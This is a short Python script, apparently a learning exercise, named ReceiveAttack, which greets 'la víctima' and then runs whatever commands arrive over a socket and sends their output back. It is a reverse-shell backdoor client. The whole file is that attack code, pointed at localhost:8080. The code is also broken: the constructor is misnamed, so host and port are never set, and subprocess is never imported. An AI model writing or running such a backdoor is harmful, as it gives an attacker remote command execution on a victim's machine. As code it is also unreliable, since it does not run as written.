import socket

class ReceiveAttack:
    def __init(self):
        self.HOST = "localhost"
        self.PORT = 8080

    def receive_attack(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((self.HOST, self.PORT))

            s.sendall("Bienvenido a la víctima".encode('utf-8'))

            while True:
                self.data = s.recv(1024)
                self.message = self.data.decode()

                self.info = subprocess.run([self.message], capture_output=True, text=True)

                s.sendall(f"{self.info}".encode('utf-8'))

if __name__ == '__main__':
    app = ReceiveAttack()
    app.receive_attack()
